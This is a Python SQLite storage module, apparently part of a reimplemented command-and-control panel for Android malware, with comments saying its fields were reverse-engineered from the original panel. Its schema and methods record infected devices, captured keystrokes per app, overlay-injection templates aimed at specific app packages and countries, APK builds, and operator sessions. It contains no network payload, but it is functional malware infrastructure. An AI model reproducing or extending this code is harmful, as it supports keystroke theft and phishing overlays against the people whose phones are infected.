#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""· 数据层（SQLite）
表结构按反推出的字段建立（来源：面板 bundle 的 API 契约 + 中继通道 SPA 的字段用法）
不变量：无外部依赖（stdlib sqlite3）；写失败自动降级为内存/JSON 存储
"""
import json, os, sqlite3, time

HERE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(HERE, '..', 'state', 'refc2.db')
JSON_STORE = os.path.join(HERE, '..', 'state', 'store.json')

SCHEMA = """
CREATE TABLE IF NOT EXISTS devices (
  device_id TEXT PRIMARY KEY, apk_id TEXT, online INTEGER DEFAULT 0,
  first_seen INTEGER, last_seen INTEGER, shots INTEGER DEFAULT 0,
  caps TEXT DEFAULT '[]', note TEXT DEFAULT '', mark TEXT DEFAULT '{}',
  pinned INTEGER DEFAULT 0, group_id TEXT, blacklisted INTEGER DEFAULT 0,
  battery INTEGER, model TEXT, brand TEXT
);
CREATE TABLE IF NOT EXISTS device_events (
  id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, action TEXT,
  payload TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS inject_settings (
  id TEXT PRIMARY KEY, package_name TEXT, app_name TEXT, template_url TEXT,
  fullscreen INTEGER, country TEXT, enabled INTEGER, logo TEXT, created INTEGER
);
CREATE TABLE IF NOT EXISTS inj_records (
  id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, package_name TEXT,
  app_name TEXT, enabled INTEGER, ts INTEGER
);
CREATE TABLE IF NOT EXISTS inj_track (
  device_id TEXT PRIMARY KEY, state TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS keylogs (
  id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, pkg TEXT, type TEXT,
  text TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS memos (
  id TEXT PRIMARY KEY, device_id TEXT, text TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS groups (
  id TEXT PRIMARY KEY, name TEXT, color TEXT, device_ids TEXT
);
CREATE TABLE IF NOT EXISTS users (
  username TEXT PRIMARY KEY, role TEXT, apk_id TEXT, child_users TEXT, created INTEGER
);
CREATE TABLE IF NOT EXISTS sessions (
  token TEXT PRIMARY KEY, actor TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS audit (
  id INTEGER PRIMARY KEY AUTOINCREMENT, actor TEXT, action TEXT, detail TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS builds (
  id TEXT PRIMARY KEY, apk_id TEXT, profile TEXT, status TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS ai_tasks (
  id TEXT PRIMARY KEY, device_id TEXT, status TEXT, ts INTEGER, payload TEXT
);
CREATE TABLE IF NOT EXISTS banners (
  id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT, body TEXT, url TEXT,
  targets TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS kv (
  k TEXT PRIMARY KEY, v TEXT
);
CREATE INDEX IF NOT EXISTS idx_keylogs_dev ON keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_events_dev ON device_events(device_id);
CREATE INDEX IF NOT EXISTS idx_inj_dev ON inj_records(device_id);
"""


class DB:
    def __init__(self, path=DB_PATH):
        self.path = path
        self.ok = False
        self.conn = None
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            self.conn = sqlite3.connect(path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            self.conn.executescript(SCHEMA)
            self.conn.commit()
            self.ok = True
        except Exception as e:
            print('[db] 打开失败，降级为 JSON/内存：%s' % e)

    # ---------- 通用 ----------
    def q(self, sql, args=()):
        if not self.ok:
            return []
        try:
            cur = self.conn.execute(sql, args)
            rows = [dict(r) for r in cur.fetchall()]
            return rows
        except Exception as e:
            print('[db] 查询失败 %s: %s' % (sql[:60], e))
            return []

    def x(self, sql, args=()):
        if not self.ok:
            return False
        try:
            self.conn.execute(sql, args)
            self.conn.commit()
            return True
        except Exception as e:
            print('[db] 写入失败 %s: %s' % (sql[:60], e))
            return False

    # ---------- 设备 ----------
    def upsert_device(self, d):
        self.x("""INSERT INTO devices(device_id,apk_id,online,first_seen,last_seen,shots,caps,battery,model,brand)
                  VALUES(?,?,?,?,?,?,?,?,?,?)
                  ON CONFLICT(device_id) DO UPDATE SET online=excluded.online,last_seen=excluded.last_seen,
                  shots=excluded.shots,caps=excluded.caps,battery=excluded.battery,
                  model=excluded.model,brand=excluded.brand""",
               (d.get('deviceId'), d.get('apkId'), 1 if d.get('online') else 0,
                d.get('firstSeen') or int(time.time()), d.get('lastSeen') or int(time.time()),
                d.get('shots') or 0, json.dumps(d.get('caps') or []), d.get('battery'),
                d.get('model'), d.get('brand')))

    def list_devices(self):
        return self.q("SELECT * FROM devices ORDER BY last_seen DESC")

    def prune_events(self, keep_days=3, max_rows=50000):
        """保留策略：删掉超过 keep_days 的事件；再多就按行数砍到 max_rows。

        为什么必须做：设备每来一帧就写一条事件（~0.9 行/秒），不清理库会一直涨。
        """
        try:
            cutoff = int(time.time()) - keep_days * 86400
            n1 = self.x("DELETE FROM device_events WHERE ts < ?", (cutoff,))
            n2 = 0
            cnt = self.q("SELECT COUNT(*) AS c FROM device_events")
            total = (cnt[0].get('c') if cnt else 0) or 0
            if total > max_rows:
                n2 = self.x("DELETE FROM device_events WHERE id NOT IN "
                            "(SELECT id FROM device_events ORDER BY id DESC LIMIT ?)",
                            (max_rows,))
            return (n1 or 0) + (n2 or 0)
        except Exception as e:
            print('[db] prune_events 失败: %s' % str(e)[:80])
            return 0

    def add_event(self, device_id, action, payload=None):
        self.x("INSERT INTO device_events(device_id,action,payload,ts) VALUES(?,?,?,?)",
               (device_id, action, json.dumps(payload or {})[:4000], int(time.time())))

    def events(self, device_id=None, limit=100):
        if device_id:
            return self.q("SELECT * FROM device_events WHERE device_id=? ORDER BY id DESC LIMIT ?",
                          (device_id, limit))
        return self.q("SELECT * FROM device_events ORDER BY id DESC LIMIT ?", (limit,))

    # ---------- 注入 ----------
    def inject_list(self):
        return self.q("SELECT * FROM inject_settings ORDER BY created DESC")

    def inject_add(self, it):
        self.x("""INSERT INTO inject_settings(id,package_name,app_name,template_url,fullscreen,country,enabled,logo,created)
                  VALUES(?,?,?,?,?,?,?,?,?)""",
               (it['id'], it['package_name'], it['app_name'], it['template_url'],
                1 if it['fullscreen'] else 0, it['country'], 1 if it['enabled'] else 0,
                it.get('logo', ''), it['created']))

    def inject_update(self, iid, fields):
        """只更新表里真实存在的列（内存对象可能带 category/alias 等非列字段，
        早期把全部键当列名拼 SQL → 报错被上层吞掉 → "改了没生效"，见 F-67）"""
        if not fields:
            return False
        cols_ok = {'package_name', 'app_name', 'template_url', 'fullscreen', 'country',
                   'enabled', 'logo'}
        use = {k: v for k, v in fields.items() if k in cols_ok}
        if not use:
            return False
        if 'fullscreen' in use:
            use['fullscreen'] = 1 if use['fullscreen'] else 0
        if 'enabled' in use:
            use['enabled'] = 1 if use['enabled'] else 0
        cols = ','.join('%s=?' % k for k in use)
        return self.x("UPDATE inject_settings SET %s WHERE id=?" % cols,
                      tuple(use.values()) + (iid,))

    def inject_delete(self, iid):
        return self.x("DELETE FROM inject_settings WHERE id=?", (iid,))

    def inj_record_add(self, device_id, package, app):
        self.x("INSERT INTO inj_records(device_id,package_name,app_name,enabled,ts) VALUES(?,?,?,1,?)",
               (device_id, package, app, int(time.time())))

    def inj_records(self, device_id=None, limit=200):
        if device_id:
            return self.q("SELECT * FROM inj_records WHERE device_id=? ORDER BY id DESC LIMIT ?",
                          (device_id, limit))
        return self.q("SELECT * FROM inj_records ORDER BY id DESC LIMIT ?", (limit,))

    def track_set(self, device_id, state):
        self.x("""INSERT INTO inj_track(device_id,state,ts) VALUES(?,?,?)
                  ON CONFLICT(device_id) DO UPDATE SET state=excluded.state,ts=excluded.ts""",
               (device_id, state, int(time.time())))

    def track_get(self, device_id):
        r = self.q("SELECT * FROM inj_track WHERE device_id=?", (device_id,))
        return r[0] if r else None

    # ---------- 键盘 / 备忘 / 分组 / 审计 ----------
    def keylog_add(self, d):
        self.x("INSERT INTO keylogs(device_id,pkg,type,text,ts) VALUES(?,?,?,?,?)",
               (d.get('deviceId'), d.get('pkg'), d.get('type'), d.get('text'), int(time.time())))

    def keylogs(self, device_id=None, limit=200):
        if device_id:
            return self.q("SELECT * FROM keylogs WHERE device_id=? ORDER BY id DESC LIMIT ?",
                          (device_id, limit))
        return self.q("SELECT * FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))

    def memo_add(self, m):
        self.x("INSERT INTO memos(id,device_id,text,ts) VALUES(?,?,?,?)",
               (m['id'], m['deviceId'], m['text'], m['ts']))

    def memos(self, device_id=None):
        if device_id:
            return self.q("SELECT * FROM memos WHERE device_id=? ORDER BY ts DESC", (device_id,))
        return self.q("SELECT * FROM memos ORDER BY ts DESC")

    def group_upsert(self, g):
        self.x("""INSERT INTO groups(id,name,color,device_ids) VALUES(?,?,?,?)
                  ON CONFLICT(id) DO UPDATE SET name=excluded.name,color=excluded.color,
                  device_ids=excluded.device_ids""",
               (g['id'], g['name'], g['color'], json.dumps(g.get('deviceIds') or [])))

    def groups(self):
        return self.q("SELECT * FROM groups")

    def audit(self, actor, action, detail=''):
        self.x("INSERT INTO audit(actor,action,detail,ts) VALUES(?,?,?,?)",
               (actor, action, str(detail)[:300], int(time.time())))

    def audits(self, limit=200):
        return self.q("SELECT * FROM audit ORDER BY id DESC LIMIT ?", (limit,))

    # ---------- 用户 / 会话 ----------
    def ensure_user(self, username, role='admin', apk_id='10020'):
        self.x("""INSERT OR IGNORE INTO users(username,role,apk_id,child_users,created)
                  VALUES(?,?,?,'[]',?)""", (username, role, apk_id, int(time.time())))

    def users(self):
        return self.q("SELECT * FROM users")

    def session_add(self, token, actor):
        self.x("INSERT OR REPLACE INTO sessions(token,actor,ts) VALUES(?,?,?)",
               (token, actor, int(time.time())))

    def session_get(self, token):
        """按 token 取会话。服务端重启后仍有效 —— 协议约定 PHP + DB session 同样不丢，
        否则每次重启面板都要重新登录（与原版行为不符）。"""
        try:
            r = self.q("SELECT actor,ts FROM sessions WHERE token=?", (token,))
            if not r:
                return None
            row = r[0]
            if isinstance(row, dict):
                return {'actor': row.get('actor'), 'ts': row.get('ts')}
            return {'actor': row[0], 'ts': row[1]}
        except Exception:
            return None

    # ---------- 构建 / AI / 横幅 ----------
    def build_add(self, b):
        self.x("INSERT OR REPLACE INTO builds(id,apk_id,profile,status,ts) VALUES(?,?,?,?,?)",
               (b['id'], b['apkId'], b['profile'], b['status'], b['ts']))

    def builds(self):
        return self.q("SELECT * FROM builds ORDER BY ts DESC")

    def ai_task_add(self, t):
        self.x("INSERT OR REPLACE INTO ai_tasks(id,device_id,status,ts,payload) VALUES(?,?,?,?,?)",
               (t['id'], t.get('deviceId'), t['status'], t['ts'], json.dumps(t.get('payload') or {})))

    def ai_tasks(self, device_id=None, limit=100):
        if device_id:
            return self.q("SELECT * FROM ai_tasks WHERE device_id=? ORDER BY ts DESC LIMIT ?",
                          (device_id, limit))
        return self.q("SELECT * FROM ai_tasks ORDER BY ts DESC LIMIT ?", (limit,))

    def banner_add(self, b):
        self.x("INSERT INTO banners(title,body,url,targets,ts) VALUES(?,?,?,?,?)",
               (b.get('title'), b.get('body'), b.get('url'), json.dumps(b.get('targets') or []),
                int(time.time())))

    # ---------- KV ----------
    def kv_set(self, k, v):
        self.x("INSERT OR REPLACE INTO kv(k,v) VALUES(?,?)", (k, json.dumps(v, ensure_ascii=False)))

    def kv_get(self, k, default=None):
        r = self.q("SELECT v FROM kv WHERE k=?", (k,))
        if not r:
            return default
        try:
            return json.loads(r[0]['v'])
        except Exception:
            return default

    def stats(self):
        return {
            'devices': len(self.list_devices()),
            'events': len(self.q("SELECT id FROM device_events LIMIT 100000")),
            'inject_settings': len(self.inject_list()),
            'inj_records': len(self.inj_records()),
            'keylogs': len(self.keylogs()),
            'memos': len(self.memos()),
            'audit': len(self.audits(10000)),
        }


_INSTANCE = None


def get():
    global _INSTANCE
    if _INSTANCE is None:
        _INSTANCE = DB()
    return _INSTANCE
